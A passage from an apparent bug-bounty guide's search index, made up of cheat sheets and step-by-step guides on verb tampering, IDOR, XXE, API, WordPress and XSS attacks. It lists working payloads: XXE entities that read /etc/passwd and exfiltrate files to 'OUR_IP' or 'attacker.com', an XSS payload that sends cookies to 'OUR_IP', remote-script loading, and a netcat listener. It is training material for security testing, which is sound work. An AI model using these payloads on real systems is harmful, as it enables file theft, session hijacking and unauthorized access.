variations.</li> <li>Burp Scanner: Automated vulnerability scanning.</li> <li>ZAP Scanner: Similar automated scans.</li> <li>Extensions: Add custom scripts (e.g., for CSRF testing).</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#tools","title":"Tools","text":"<ul> <li>Burp Suite (https://portswigger.net/burp).</li> <li>OWASP ZAP (https://www.zaproxy.org/).</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-cheat/","title":"Web Attacks Cheat Sheet","text":""},{"location":"bug-bounty-guide/web-attacks-cheat/#http-verb-tampering","title":"HTTP Verb Tampering","text":""},{"location":"bug-bounty-guide/web-attacks-cheat/#http-method","title":"HTTP Method","text":"<ul> <li>HEAD</li> <li>PUT</li> <li>DELETE</li> <li>OPTIONS</li> <li>PATCH</li> </ul> Command Description <code>-X OPTIONS</code> Set HTTP Method with Curl"},{"location":"bug-bounty-guide/web-attacks-cheat/#idor","title":"IDOR","text":""},{"location":"bug-bounty-guide/web-attacks-cheat/#identify-idors","title":"Identify IDORs","text":"<ul> <li>In URL parameters &amp; APIs</li> <li>In AJAX Calls</li> <li>By understanding reference hashing/encoding</li> <li>By comparing user roles</li> </ul> Command Description <code>md5sum</code> MD5 hash a string <code>base64</code> Base64 encode a string"},{"location":"bug-bounty-guide/web-attacks-cheat/#xxe","title":"XXE","text":"Code Description <code>&lt;!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"&gt;</code> Define External Entity to a URL <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> Define External Entity to a file path <code>&lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;</code> Read PHP source code with base64 encode filter <code>&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;</code> Reading a file through a PHP error <code>&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;</code> Reading a file OOB exfiltration"},{"location":"bug-bounty-guide/web-attacks-guide/","title":"Web Attacks","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/web-attacks-guide/#step-by-step-guide-for-testing-and-exploiting-web-attacks-http-verb-tampering-idor-xxe","title":"Step-by-Step Guide for Testing and Exploiting Web Attacks (HTTP Verb Tampering, IDOR, XXE)","text":""},{"location":"bug-bounty-guide/web-attacks-guide/#1-understand-web-attack-types","title":"1. Understand Web Attack Types","text":"<ul> <li>Explanation: Web attacks include HTTP Verb Tampering (bypassing controls via method changes), Insecure Direct Object References (IDOR, accessing unauthorized objects via direct IDs), and XML External Entity (XXE, exploiting XML parsing for file access or SSRF). Each exploits specific misconfigurations.</li> <li>Why It's Done: Knowing the attack types guides testing for specific weaknesses, like poor access controls or unsafe XML processing.</li> <li>Example: Changing a GET to DELETE to bypass auth, or accessing <code>/user/123</code> as <code>/user/124</code>.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#2-test-for-http-verb-tampering","title":"2. Test for HTTP Verb Tampering","text":"<ul> <li>Explanation: Send non-standard HTTP methods (e.g., PUT, DELETE, OPTIONS) to endpoints expecting GET/POST to bypass restrictions.</li> <li>Why It's Done: Some apps enforce controls only on common methods, allowing unauthorized actions.</li> <li>Example: <code>curl -X DELETE http://example.com/admin/delete</code> to delete resources without auth.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#3-identify-idor-points","title":"3. Identify IDOR Points","text":"<ul> <li>Explanation: Look for direct references in URLs, API calls, or AJAX (e.g., <code>/user/123</code>, <code>id=123</code>) that identify objects like users or files.</li> <li>Why It's Done: Modifiable references can lead to unauthorized data access.</li> <li>Example: <code>/profile?id=123</code> where <code>id</code> is a user ID.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#4-test-idor-exploitation","title":"4. Test IDOR Exploitation","text":"<ul> <li>Explanation: Modify the reference (e.g., change <code>id=123</code> to <code>id=124</code>) to access another user\u2019s data or resources.</li> <li>Why It's Done: Confirms if access controls are missing, allowing data breaches.</li> <li>Example: Change <code>/user/123</code> to <code>/user/124</code> to view another user\u2019s profile.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#5-mass-enumerate-idor","title":"5. Mass Enumerate IDOR","text":"<ul> <li>Explanation: Fuzz IDs or encoded references (e.g., base64, MD5) using tools like ffuf to access multiple objects.</li> <li>Why It's Done: Scales the attack to expose more unauthorized data.</li> <li>Example: <code>ffuf -w ids.txt:FUZZ -u http://example.com/user/FUZZ</code>.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#6-test-for-xxe","title":"6. Test for XXE","text":"<ul> <li>Explanation: Submit XML payloads with external entities (e.g., <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code>) to inputs processed by XML parsers.</li> <li>Why It's Done: XXE can read files, perform SSRF, or cause DoS via entity expansion.</li> <li>Example: XML form input with <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;</code>.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#7-exploit-xxe-for-data-exfiltration","title":"7. Exploit XXE for Data Exfiltration","text":"<ul> <li>Explanation: Use blind XXE with out-of-band (OOB) exfiltration (<code>&lt;!ENTITY xxe SYSTEM \"http://attacker.com/?data=%file;\"&gt;</code>) or base64 filters for code.</li> <li>Why It's Done: Extracts data when direct output isn\u2019t available.</li> <li>Example: <code>&lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;</code> to read source code.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#8-chain-attacks","title":"8. Chain Attacks","text":"<ul> <li>Explanation: Combine IDOR with APIs, XXE with SSRF, or verb tampering with auth bypass for escalation.</li> <li>Why It's Done: Increases impact, like accessing admin data or RCE.</li> <li>Example: IDOR to access admin ID, then XXE to read internal files.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#9-test-prevention-measures","title":"9. Test Prevention Measures","text":"<ul> <li>Explanation: Check for indirect references (UUIDs), method restrictions, or XML parser disabling external entities.</li> <li>Why It's Done: Informs remediation, like using randomized IDs or secure parsing.</li> <li>Example: Secure app uses UUIDs instead of sequential IDs.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks-guide/#10-use-tools-for-efficiency","title":"10. Use Tools for Efficiency","text":"<ul> <li>Explanation: Use Burp for verb tampering, ffuf for IDOR fuzzing, or Postman for XML testing.</li> <li>Why It's Done: Automates repetitive tasks and scales testing.</li> <li>Example: Burp Intruder to fuzz <code>id</code> parameters.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, equips hunters to test web attacks effectively. Test ethically within scope.</p>"},{"location":"bug-bounty-guide/web-requests/","title":"Web Requests Cheat Sheet","text":""},{"location":"bug-bounty-guide/web-requests/#curl","title":"cURL","text":"Command Description <code>curl -h</code> cURL help menu <code>curl inlanefreight.com</code> Basic GET request <code>curl -s -O inlanefreight.com/index.html</code> Download file <code>curl -k https://inlanefreight.com</code> Skip HTTPS (SSL) certificate validation <code>curl inlanefreight.com -v</code> Print full HTTP request/response details <code>curl -I https://www.inlanefreight.com</code> Send HEAD request (only prints response headers) <code>curl -i https://www.inlanefreight.com</code> Print response headers and response body <code>curl https://www.inlanefreight.com -A 'Mozilla/5.0'</code> Set User-Agent header <code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set HTTP basic authorization credentials <code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Pass HTTP basic authorization credentials in the URL <code>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request header <code>curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le'</code> Pass GET parameters <code>curl -X POST -d 'username=admin&amp;password=admin' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Send POST request with POST data <code>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request cookies <code>curl -X POST -d '{\"search\":\"london\"}' -H 'Content-Type: application/json' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code> Send POST request with JSON data"},{"location":"bug-bounty-guide/web-requests/#apis","title":"APIs","text":"Command Description <code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code> Read entry <code>curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ | jq</code> Read all entries <code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d '{\"city_name\":\"HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Create (add) entry <code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d '{\"city_name\":\"New_HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Update (modify) entry <code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code> Delete entry"},{"location":"bug-bounty-guide/web-requests/#browser-devtools","title":"Browser DevTools","text":"Shortcut Description <code>[CTRL+SHIFT+I]</code> or <code>[F12]</code> Show devtools <code>[CTRL+SHIFT+E]</code> Show Network tab <code>[CTRL+SHIFT+K]</code> Show Console tab"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/","title":"Web Service &amp; API Attacks","text":""},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#overview","title":"Overview","text":"<p>Web service and API attacks target vulnerabilities in application programming interfaces (APIs), which are critical for modern web applications using REST, SOAP, or XML-RPC protocols. These attacks exploit weaknesses in authentication, input validation, and data handling, potentially leading to data breaches, remote code execution (RCE), or unauthorized access. APIs are often exposed to external users, making them a prime target in bug bounty hunting.</p>"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#common-vulnerabilities","title":"Common Vulnerabilities","text":"<ul> <li>Injection Attacks: SQL injection or command injection in API parameters can manipulate backend queries or execute system commands. For example, an API endpoint <code>/api/users?id=1</code> might allow <code>id=1' OR '1'='1</code> to bypass authentication.</li> <li>Authentication Bypass: Weak or missing authentication (e.g., no API key, predictable tokens) allows unauthorized access to sensitive endpoints.</li> <li>Server-Side Request Forgery (SSRF): APIs accepting URLs (e.g., <code>/api/fetch?url=http://target</code>) can be tricked into accessing internal resources like <code>http://localhost:8080/admin</code>.</li> <li>XML External Entity (XXE): SOAP or XML-based APIs processing unvalidated XML can read files or perform SSRF via entities like <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code>.</li> </ul>"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#xmlrpc-eg-wordpress","title":"XMLRPC (e.g., WordPress)","text":"<ul> <li>Description: XML-RPC, commonly enabled in WordPress via <code>/xmlrpc.php</code>, allows remote procedure calls. It\u2019s often misconfigured, enabling brute force attacks, information leaks, or denial-of-service (DoS) via pingback methods.</li> <li>Examples: Brute forcing credentials with <code>wp.getUsersBlogs</code> or flooding with <code>pingback.ping</code> requests.</li> <li>Mitigation: Disable XML-RPC unless required, restrict methods with <code>.htaccess</code>, or use authentication plugins.</li> </ul>"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#rate-limiting-and-business-logic-flaws","title":"Rate Limiting and Business Logic Flaws","text":"<ul> <li>Rate Limiting: APIs without rate limits are susceptible to brute force or DoS. Check for headers like <code>X-Rate-Limit-Limit</code>.</li> <li>Business Logic Flaws: Misconfigured workflows (e.g., bypassing payment verification) can be exploited if inputs aren\u2019t validated.</li> </ul>"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#prevention-strategies","title":"Prevention Strategies","text":"<ul> <li>Strong Authentication: Implement OAuth 2.0, API keys, or JWT with signature validation to secure access.</li> <li>Input Validation: Sanitize and validate all API inputs to prevent injection or SSRF.</li> <li>Disable External Entities: Configure XML parsers to reject external entities (XXE) and restrict URL schemes.</li> <li>Rate Limiting: Enforce API quotas (e.g., 100 requests/hour) and monitor usage.</li> <li>Secure Coding: Follow OWASP API Security Top 10 guidelines to avoid logic flaws.</li> </ul>"},{"location":"bug-bounty-guide/web-service-api-attacks-guide/#tools-and-resources","title":"Tools and Resources","text":"<ul> <li>Postman (https://www.postman.com/): Test API endpoints and payloads.</li> <li>Burp Suite (https://portswigger.net/burp): Intercept and manipulate API requests.</li> <li>OWASP API Security (https://owasp.org/www-project-api-security/): Best practices and vulnerabilities.</li> </ul> <p>This guide offers a detailed insight into API attack surfaces, leveraging web security standards and the provided cheat sheet. Explore further with OWASP resources for advanced techniques.</p>"},{"location":"bug-bounty-guide/wordpress-cheat/","title":"Hacking WordPress Cheat Sheet","text":""},{"location":"bug-bounty-guide/wordpress-cheat/#commands","title":"Commands","text":"Command Description <code>tree -L 1</code> Lists contents of current directory <code>curl -s -X GET &lt;url&gt;</code> Makes a GET request to a webserver and receives HTML source code of requested web page <code>curl -I -X GET &lt;url&gt;</code> Prints the response header of the GET request from the requested web page <code>curl -X POST -d &lt;data&gt; &lt;url&gt;</code> Sends a POST request with data to specific webserver <code>wpscan --url &lt;url&gt; -e ap</code> Scans specific WordPress application to enumerate plugins <code>wpscan --url &lt;url&gt; -e u</code> Scans specific WordPress application to enumerate users <code>msfconsole</code> Starts Metasploit Framework <code>html2text</code> Converts redirected HTML output or files to easily readable output <code>grep &lt;pattern&gt;</code> Filters specific pattern in files or redirected output <code>jq</code> Transforms JSON input and streams of JSON entities <code>man &lt;tool&gt;</code> Man provides you with the manpage of the specific tool"},{"location":"bug-bounty-guide/xss-cheat/","title":"Cross-Site Scripting (XSS) Cheat Sheet","text":""},{"location":"bug-bounty-guide/xss-cheat/#xss-payloads","title":"XSS Payloads","text":"Code Description <code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> Basic XSS Payload <code>&lt;plaintext&gt;</code> Basic XSS Payload <code>&lt;script&gt;print()&lt;/script&gt;</code> Basic XSS Payload <code>&lt;img src=\"\" onerror=alert(window.origin)&gt;</code> HTML-based XSS Payload <code>&lt;script&gt;document.body.style.background = \"#141d2b\"&lt;/script&gt;</code> Change Background Color <code>&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;</code> Change Background Image <code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code> Change Website Title <code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code> Overwrite website's main body <code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code> Remove certain HTML element <code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;</code> Load remote script <code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code> Send Cookie details to us"},{"location":"bug-bounty-guide/xss-cheat/#commands","title":"Commands","text":"Command Description <code>python xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"</code> Run xsstrike on a url parameter <code>sudo nc -lvnp 80</code> Start netcat listener <code>sudo php -S 0.0.0.0:80</code> Start PHP server"}]}